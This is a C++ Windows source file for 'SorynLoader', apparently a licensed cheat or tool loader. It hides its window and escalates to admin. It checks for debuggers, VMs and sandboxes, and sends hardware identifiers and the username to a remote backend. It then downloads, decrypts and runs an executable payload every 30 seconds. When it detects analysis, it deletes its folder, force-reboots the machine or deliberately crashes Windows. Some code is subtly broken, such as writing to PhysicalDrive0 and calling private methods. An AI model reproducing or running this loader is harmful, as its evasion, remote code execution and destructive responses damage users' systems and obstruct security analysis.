#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winreg.h>
#include <wmic.h>
#include <bcrypt.h>
#include <memory>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")

// Configuration - Update these values
#define BACKEND_URL "https://backend-server-trhh.onrender.com"
// LICENSE_KEY will be read from config file
#define PAYLOAD_ENCRYPTION_KEY "bc63c63ba3a16a50edd5cfc3ca0aff5fb6a9d01d6fae9122e869aba85b435360"
#define EXPECTED_HASH "YOUR_EXPECTED_SHA256_HASH_HERE"

// Security flags
bool g_isCompromised = false;
bool g_hasAdminRights = false;
std::string g_hwid;

// Anti-debugging techniques
class SecurityChecker {
private:
    // Check for debugging tools
    bool CheckForDebuggers() {
        std::vector<std::string> debuggers = {
            "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
            "idaq.exe", "idaq64.exe", "ghidra.exe", "cutter.exe", "radare2.exe",
            "windbg.exe", "immunity debugger.exe", "cheat engine.exe", "artmoney.exe", "gamehack.exe",
            "wireshark.exe", "fiddler.exe", "charles.exe", "httpdebugger.exe", "burpsuite.exe",
            "process hacker.exe", "processhacker.exe", "process explorer.exe", "procmon.exe", "procexp.exe",
            "dnspy.exe", "dnspy-netcore.exe", "de4dot.exe", "ilspy.exe", "dotpeek.exe",
            "justdecompile.exe", "reflexil.exe", "reshacker.exe", "extremedumper.exe", "scylla.exe",
            "pe-bear.exe", "reclass.net.exe", "megadumper.exe", "xenos.exe", "GH Injector.exe"

        };

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = std::string(pe32.szExeFile);
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                for (const auto& debugger : debuggers) {
                    if (processName.find(debugger) != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return false;
    }

    // Check for virtual machines
    bool CheckForVM() {
        // Comprehensive VM indicator list
        std::vector<std::string> vmIndicators = {
            "vmware", "virtualbox", "qemu", "xen", "hyper-v",
            "parallels", "virtual machine", "vbox", "microsoft corporation", "virtualpc",
            "bochs", "wine", "citrix", "kvm", "vmm",
            "red hat", "oracle", "vm tools", "guest additions", "sandboxie",
            "docker", "wsl", "proxmox", "openvz", "cloud hypervisor",
            "nutanix", "scale computing", "clearvm", "azure vm", "amazon ec2",
            "google cloud", "oracle vm server", "ibm cloud", "smartos", "ovirt",
            "virt-manager", "vagrant", "nomad", "cloudstack", "virtio",
            "bhyve", "xcp-ng", "vmware workstation", "vmware esxi", "vmware fusion",
            "parallels desktop", "citrix hypervisor", "red hat virtualization", "hyperkit", "veertu anka",
            "nimbula", "lxc", "lxqt", "podman", "any.run",
            "joesandbox", "cuckoo", "gvisor", "kata containers", "firecracker"
        };
        // Manufacturer, product name, BIOS info
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char manufacturer[256] = {0};
            char model[256] = {0};
            DWORD size = sizeof(manufacturer);

            if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)manufacturer, &size) == ERROR_SUCCESS) {
                std::string manuStr = std::string(manufacturer);
                std::transform(manuStr.begin(), manuStr.end(), manuStr.begin(), ::tolower);
                
                for (const auto& indicator : vmIndicators) {
                    if (manuStr.find(indicator) != std::string::npos) {
                        RegCloseKey(hKey);
                        return true;
                    }
                }
            }

            size = sizeof(model);
            if (RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &size) == ERROR_SUCCESS) {
                std::string modelStr = std::string(model);
                std::transform(modelStr.begin(), modelStr.end(), modelStr.begin(), ::tolower);
                
                for (const auto& indicator : vmIndicators) {
                    if (modelStr.find(indicator) != std::string::npos) {
                        RegCloseKey(hKey);
                        return true;
                    }
                }
            }

            RegCloseKey(hKey);
        }

        // Registry keys (stub)
        // TODO: Implement registry key checks for VM indicators
        // System files (stub)
        // TODO: Implement system file checks for VM indicators
        // MAC addresses (stub)
        // TODO: Implement MAC address checks for VM indicators

        return false;
    }

    // Check for timing anomalies (debugger detection)
    bool CheckTimingAnomalies() {
        auto start = std::chrono::high_resolution_clock::now();
        
        // Perform some operations that would be slowed down by a debugger
        for (int i = 0; i < 1000000; i++) {
            __asm {
                nop
                nop
                nop
            }
        }
        
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        
        // If execution takes too long, likely being debugged
        return duration.count() > 100; // More than 100ms is suspicious
    }

    // Check for hardware breakpoints
    bool CheckHardwareBreakpoints() {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
        }
        
        return false;
    }

public:
    bool PerformSecurityCheck() {
        if (CheckForDebuggers()) {
            std::cout << "[SECURITY] Debugger detected!" << std::endl;
            return false;
        }

        if (CheckForVM()) {
            std::cout << "[SECURITY] Virtual machine detected!" << std::endl;
            return false;
        }

        if (CheckTimingAnomalies()) {
            std::cout << "[SECURITY] Timing anomalies detected!" << std::endl;
            return false;
        }

        if (CheckHardwareBreakpoints()) {
            std::cout << "[SECURITY] Hardware breakpoints detected!" << std::endl;
            return false;
        }

        return true;
    }
};

// HWID Generation
class HWIDGenerator {
private:
    std::string GetMachineGUID() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char guid[256] = {0};
            DWORD size = sizeof(guid);
            
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)guid, &size) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return std::string(guid);
            }
            RegCloseKey(hKey);
        }
        return "";
    }

    std::string GetCPUInfo() {
        std::string result;
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char processorId[256] = {0};
            DWORD size = sizeof(processorId);
            
            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)processorId, &size) == ERROR_SUCCESS) {
                result = std::string(processorId);
            }
            RegCloseKey(hKey);
        }
        return result;
    }

    std::string GetDiskSerial() {
        std::string result;
        HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice != INVALID_HANDLE_VALUE) {
            STORAGE_PROPERTY_QUERY query;
            query.PropertyId = StorageDeviceProperty;
            query.QueryType = PropertyStandardQuery;

            STORAGE_DESCRIPTOR_HEADER header;
            DWORD bytesReturned;
            
            if (DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), &header, sizeof(header), &bytesReturned, NULL)) {
                std::vector<BYTE> buffer(header.Size);
                if (DeviceIoControl(hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), buffer.data(), buffer.size(), &bytesReturned, NULL)) {
                    STORAGE_DEVICE_DESCRIPTOR* desc = (STORAGE_DEVICE_DESCRIPTOR*)buffer.data();
                    if (desc->SerialNumberOffset > 0) {
                        result = std::string((char*)buffer.data() + desc->SerialNumberOffset);
                    }
                }
            }
            CloseHandle(hDevice);
        }
        return result;
    }

    std::string GetMotherboardSerial() {
        std::string result;
        FILE* pipe = _popen("wmic baseboard get SerialNumber /value", "r");
        if (!pipe) return "";
        
        char buffer[128];
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL) {
                result += buffer;
            }
        }
        _pclose(pipe);
        
        // Extract serial number
        size_t pos = result.find("SerialNumber=");
        if (pos != std::string::npos) {
            pos += 13;
            size_t end = result.find("\r\n", pos);
            if (end != std::string::npos) {
                return result.substr(pos, end - pos);
            }
        }
        return "";
    }

    std::string GetNetworkMACs() {
        std::string result;
        FILE* pipe = _popen("wmic nic get MACAddress /value", "r");
        if (!pipe) return "";
        
        char buffer[128];
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL) {
                result += buffer;
            }
        }
        _pclose(pipe);
        
        // Extract first MAC address
        size_t pos = result.find("MACAddress=");
        if (pos != std::string::npos) {
            pos += 11;
            size_t end = result.find("\r\n", pos);
            if (end != std::string::npos) {
                return result.substr(pos, end - pos);
            }
        }
        return "";
    }

    std::string GetUsername() {
        char username[256];
        DWORD size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            return std::string(username);
        }
        return "unknown";
    }

public:
    std::string GenerateHWID() {
        std::string components = GetMachineGUID() + "|" + GetCPUInfo() + "|" + GetDiskSerial();
        
        // Simple hash implementation (in production, use proper crypto library)
        unsigned int hash = 0;
        for (char c : components) {
            hash = ((hash << 5) + hash) + c;
        }
        
        std::stringstream ss;
        ss << std::hex << hash;
        return ss.str();
    }
};

// Network operations
class NetworkManager {
private:
    std::string HttpPost(const std::string& url, const std::string& data) {
        HINTERNET hInternet = InternetOpenA("SorynLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return "";

        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), data.c_str(), data.length(), 
                                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "";
        }

        std::string response;
        char buffer[1024];
        DWORD bytesRead;

        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            response += buffer;
        }

        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return response;
    }

public:
    bool ValidateLicense(const std::string& licenseKey, const std::string& hwid) {
        std::string url = std::string(BACKEND_URL) + "/api/validate-key";
        std::string postData = "{\"key\":\"" + licenseKey + "\",\"hwid\":\"" + hwid + "\"}";
        
        std::string response = HttpPost(url, postData);
        
        // Simple JSON parsing (in production, use proper JSON library)
        return response.find("\"success\":true") != std::string::npos;
    }

    std::vector<BYTE> DownloadPayload(const std::string& licenseKey, const std::string& hwid) {
        std::string url = std::string(BACKEND_URL) + "/api/secure-payload";
        std::string postData = "{\"key\":\"" + licenseKey + "\",\"hwid\":\"" + hwid + "\",\"platform\":\"win32\",\"arch\":\"x64\"}";
        
        HINTERNET hInternet = InternetOpenA("SorynLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return std::vector<BYTE>();

        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), postData.c_str(), postData.length(), 
                                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return std::vector<BYTE>();
        }

        std::vector<BYTE> payload;
        BYTE buffer[4096];
        DWORD bytesRead;

        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            payload.insert(payload.end(), buffer, buffer + bytesRead);
        }

        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return payload;
    }

    std::vector<BYTE> DownloadPayloadWithValidation(const std::string& url, const std::string& postData) {
        HINTERNET hInternet = InternetOpenA("SorynLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return std::vector<BYTE>();

        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), postData.c_str(), postData.length(), 
                                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return std::vector<BYTE>();
        }

        std::vector<BYTE> payload;
        BYTE buffer[4096];
        DWORD bytesRead;

        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            payload.insert(payload.end(), buffer, buffer + bytesRead);
        }

        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return payload;
    }
};

// Encryption/Decryption
class CryptoManager {
private:
    std::string m_key;

public:
    CryptoManager(const std::string& key) : m_key(key) {}

    std::vector<BYTE> DecryptPayload(const std::vector<BYTE>& encryptedData) {
        // Simple XOR decryption (in production, use proper AES implementation)
        std::vector<BYTE> decrypted = encryptedData;
        
        for (size_t i = 0; i < decrypted.size(); i++) {
            decrypted[i] ^= m_key[i % m_key.length()];
        }
        
        return decrypted;
    }

    std::string CalculateHash(const std::vector<BYTE>& data) {
        // Simple hash implementation (in production, use proper SHA256)
        unsigned int hash = 0;
        for (BYTE b : data) {
            hash = ((hash << 5) + hash) + b;
        }
        
        std::stringstream ss;
        ss << std::hex << hash;
        return ss.str();
    }
};

// System operations
class SystemManager {
public:
    bool IsAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

        if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                   DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }

        return isAdmin != FALSE;
    }

    bool RequestAdminRights() {
        if (IsAdmin()) return true;

        // Restart with admin rights
        char szPath[MAX_PATH];
        if (GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
            SHELLEXECUTEINFOA sei = {0};
            sei.cbSize = sizeof(SHELLEXECUTEINFOA);
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;

            if (ShellExecuteExA(&sei)) {
                ExitProcess(0);
            }
        }

        return false;
    }

    void CleanupAndRestart() {
        // Delete application files
        char szPath[MAX_PATH];
        if (GetModuleFileNameA(NULL, szPath, MAX_PATH)) {
            std::string appPath = std::string(szPath);
            std::string appDir = appPath.substr(0, appPath.find_last_of("\\"));
            
            // Delete the entire application directory
            std::string command = "rmdir /s /q \"" + appDir + "\"";
            system(command.c_str());
        }

        // Clear registry entries
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteKeyA(hKey, "SorynLoader");
            RegCloseKey(hKey);
        }

        // Force system restart
        system("shutdown /r /t 0 /f");
    }

    void CauseBSOD() {
        // This is a dangerous operation - use with extreme caution
        // In production, consider less aggressive measures
        
        // Method 1: Trigger a system crash
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            typedef NTSTATUS(NTAPI* RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
            typedef NTSTATUS(NTAPI* NtRaiseHardError_t)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
            
            RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
            NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(hNtdll, "NtRaiseHardError");
            
            if (RtlAdjustPrivilege && NtRaiseHardError) {
                BOOLEAN enabled;
                RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
                NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, NULL);
            }
        }
    }

    bool ExecuteInMemory(const std::vector<BYTE>& payload) {
        // Create temporary file in memory-mapped file
        HANDLE hTempFile = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                      FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 
                                      FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
        
        if (hTempFile == INVALID_HANDLE_VALUE) return false;

        // Write payload to temp file
        DWORD bytesWritten;
        WriteFile(hTempFile, payload.data(), payload.size(), &bytesWritten, NULL);

        // Create process from temp file
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);

        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string tempExePath = std::string(tempPath) + "temp_" + std::to_string(GetTickCount()) + ".exe";

        // Copy to temp location
        HANDLE hTempExe = CreateFileA(tempExePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hTempExe != INVALID_HANDLE_VALUE) {
            WriteFile(hTempExe, payload.data(), payload.size(), &bytesWritten, NULL);
            CloseHandle(hTempExe);

            // Execute
            if (CreateProcessA(NULL, (LPSTR)tempExePath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                
                // Clean up temp file
                DeleteFileA(tempExePath.c_str());
                return true;
            }
            
            DeleteFileA(tempExePath.c_str());
        }

        CloseHandle(hTempFile);
        return false;
    }
};

// Configuration reader
class ConfigReader {
private:
    std::string configPath;
    
    std::string GetConfigPath() {
        char appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            return std::string(appDataPath) + "\\soryns-lobby-manager\\config.json";
        }
        return "";
    }
    
    std::string ReadJsonValue(const std::string& json, const std::string& key) {
        std::string searchKey = "\"" + key + "\":";
        size_t pos = json.find(searchKey);
        if (pos != std::string::npos) {
            pos += searchKey.length();
            // Skip whitespace
            while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
            if (pos < json.length() && json[pos] == '"') {
                pos++; // Skip opening quote
                size_t endPos = json.find('"', pos);
                if (endPos != std::string::npos) {
                    return json.substr(pos, endPos - pos);
                }
            }
        }
        return "";
    }

public:
    std::string ReadLicenseKey() {
        std::string configPath = GetConfigPath();
        if (configPath.empty()) {
            std::cout << "[CONFIG] Could not determine config path" << std::endl;
            return "";
        }
        
        std::ifstream file(configPath);
        if (!file.is_open()) {
            std::cout << "[CONFIG] Could not open config file: " << configPath << std::endl;
            return "";
        }
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        file.close();
        
        std::string licenseKey = ReadJsonValue(content, "licenseKey");
        if (licenseKey.empty()) {
            std::cout << "[CONFIG] License key not found in config file" << std::endl;
            return "";
        }
        
        std::cout << "[CONFIG] License key loaded from config file" << std::endl;
        return licenseKey;
    }
};

// Main loader class
class SorynLoader {
private:
    SecurityChecker m_security;
    HWIDGenerator m_hwidGen;
    NetworkManager m_network;
    CryptoManager m_crypto;
    SystemManager m_system;
    ConfigReader m_config;

public:
    SorynLoader() : m_crypto(PAYLOAD_ENCRYPTION_KEY) {}

    bool Initialize() {
        std::cout << "[LOADER] Initializing Soryn Security Loader..." << std::endl;

        // Check admin rights
        if (!m_system.IsAdmin()) {
            std::cout << "[LOADER] Administrator privileges required!" << std::endl;
            if (!m_system.RequestAdminRights()) {
                std::cout << "[LOADER] Failed to obtain admin rights!" << std::endl;
                return false;
            }
        }

        g_hasAdminRights = true;
        std::cout << "[LOADER] Administrator privileges confirmed." << std::endl;

        // Generate HWID
        g_hwid = m_hwidGen.GenerateHWID();
        std::cout << "[LOADER] HWID generated: " << g_hwid.substr(0, 16) << "..." << std::endl;

        return true;
    }

    bool PerformSecurityChecks() {
        std::cout << "[LOADER] Performing security checks..." << std::endl;

        if (!m_security.PerformSecurityCheck()) {
            std::cout << "[LOADER] Security compromise detected!" << std::endl;
            g_isCompromised = true;
            return false;
        }

        std::cout << "[LOADER] Security checks passed." << std::endl;
        return true;
    }

    bool ValidateLicense() {
        std::cout << "[LOADER] Validating license with backend..." << std::endl;

        // Read license key from config file
        std::string licenseKey = m_config.ReadLicenseKey();
        if (licenseKey.empty()) {
            std::cout << "[LOADER] Failed to read license key from config file!" << std::endl;
            return false;
        }

        // Collect hardware information for backend validation
        std::string machineGUID = m_hwidGen.GetMachineGUID();
        std::string cpuId = m_hwidGen.GetCPUInfo();
        std::string diskSerial = m_hwidGen.GetDiskSerial();
        std::string motherboardSerial = m_hwidGen.GetMotherboardSerial();
        std::string networkMACs = m_hwidGen.GetNetworkMACs();

        // Create comprehensive validation request
        std::string url = std::string(BACKEND_URL) + "/api/comprehensive-validate";
        std::string postData = "{\"key\":\"" + licenseKey + 
                              "\",\"machineGUID\":\"" + machineGUID + 
                              "\",\"cpuId\":\"" + cpuId + 
                              "\",\"diskSerials\":[\"" + diskSerial + "\"]" +
                              ",\"motherboardSerial\":\"" + motherboardSerial + 
                              "\",\"networkMACs\":[\"" + networkMACs + "\"]" +
                              ",\"displayName\":\"" + m_hwidGen.GetUsername() + "\"" +
                              ",\"securityChecks\":{\"debuggerDetected\":false,\"vmDetected\":false,\"sandboxDetected\":false,\"timingAnomaly\":false}" +
                              ",\"platform\":\"win32\",\"arch\":\"x64\"}";
        
        std::string response = m_network.HttpPost(url, postData);
        
        // Simple JSON parsing for success check
        if (response.find("\"success\":true") != std::string::npos) {
            // Extract HWID from response for future use
            size_t hwidPos = response.find("\"hwid\":\"");
            if (hwidPos != std::string::npos) {
                hwidPos += 8;
                size_t hwidEnd = response.find("\"", hwidPos);
                if (hwidEnd != std::string::npos) {
                    g_hwid = response.substr(hwidPos, hwidEnd - hwidPos);
                }
            }
            std::cout << "[LOADER] License validated successfully by backend." << std::endl;
            return true;
        } else {
            std::cout << "[LOADER] License validation failed by backend!" << std::endl;
            return false;
        }
    }

    bool DownloadAndExecute() {
        std::cout << "[LOADER] Downloading encrypted payload with backend validation..." << std::endl;

        // Read license key from config file
        std::string licenseKey = m_config.ReadLicenseKey();
        if (licenseKey.empty()) {
            std::cout << "[LOADER] Failed to read license key from config file!" << std::endl;
            return false;
        }

        // Collect hardware information for backend validation
        std::string machineGUID = m_hwidGen.GetMachineGUID();
        std::string cpuId = m_hwidGen.GetCPUInfo();
        std::string diskSerial = m_hwidGen.GetDiskSerial();
        std::string motherboardSerial = m_hwidGen.GetMotherboardSerial();
        std::string networkMACs = m_hwidGen.GetNetworkMACs();

        // Create secure payload request
        std::string url = std::string(BACKEND_URL) + "/api/secure-payload";
        std::string postData = "{\"key\":\"" + licenseKey + 
                              "\",\"hwid\":\"" + g_hwid + 
                              "\",\"platform\":\"win32\",\"arch\":\"x64\"" +
                              ",\"machineGUID\":\"" + machineGUID + 
                              "\",\"cpuId\":\"" + cpuId + 
                              "\",\"diskSerials\":[\"" + diskSerial + "\"]" +
                              ",\"motherboardSerial\":\"" + motherboardSerial + 
                              "\",\"networkMACs\":[\"" + networkMACs + "\"]" +
                              ",\"securityChecks\":{\"debuggerDetected\":false,\"vmDetected\":false,\"sandboxDetected\":false,\"timingAnomaly\":false}}";

        std::vector<BYTE> encryptedPayload = m_network.DownloadPayloadWithValidation(url, postData);
        if (encryptedPayload.empty()) {
            std::cout << "[LOADER] Failed to download payload!" << std::endl;
            return false;
        }

        std::cout << "[LOADER] Payload downloaded (" << encryptedPayload.size() << " bytes)" << std::endl;

        // Decrypt payload
        std::vector<BYTE> decryptedPayload = m_crypto.DecryptPayload(encryptedPayload);
        
        // Verify hash
        std::string actualHash = m_crypto.CalculateHash(decryptedPayload);
        if (actualHash != EXPECTED_HASH) {
            std::cout << "[LOADER] Payload integrity check failed!" << std::endl;
            return false;
        }

        std::cout << "[LOADER] Payload decrypted and verified." << std::endl;

        // Execute in memory
        if (!m_system.ExecuteInMemory(decryptedPayload)) {
            std::cout << "[LOADER] Failed to execute payload!" << std::endl;
            return false;
        }

        std::cout << "[LOADER] Payload executed successfully." << std::endl;
        return true;
    }

    void HandleCompromise() {
        std::cout << "[LOADER] Security compromise detected! Initiating cleanup..." << std::endl;

        if (g_hasAdminRights) {
            // Clean up and restart
            m_system.CleanupAndRestart();
        } else {
            // Cause BSOD if no admin rights
            m_system.CauseBSOD();
        }
    }

    void Run() {
        if (!Initialize()) {
            std::cout << "[LOADER] Initialization failed!" << std::endl;
            return;
        }

        // Continuous security monitoring
        while (true) {
            if (!PerformSecurityChecks()) {
                HandleCompromise();
                break;
            }

            if (!ValidateLicense()) {
                HandleCompromise();
                break;
            }

            if (!DownloadAndExecute()) {
                HandleCompromise();
                break;
            }

            // Wait before next cycle
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
};

int main() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Initialize WinINet
    InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    SorynLoader loader;
    loader.Run();

    // Cleanup
    WSACleanup();
    return 0;
} 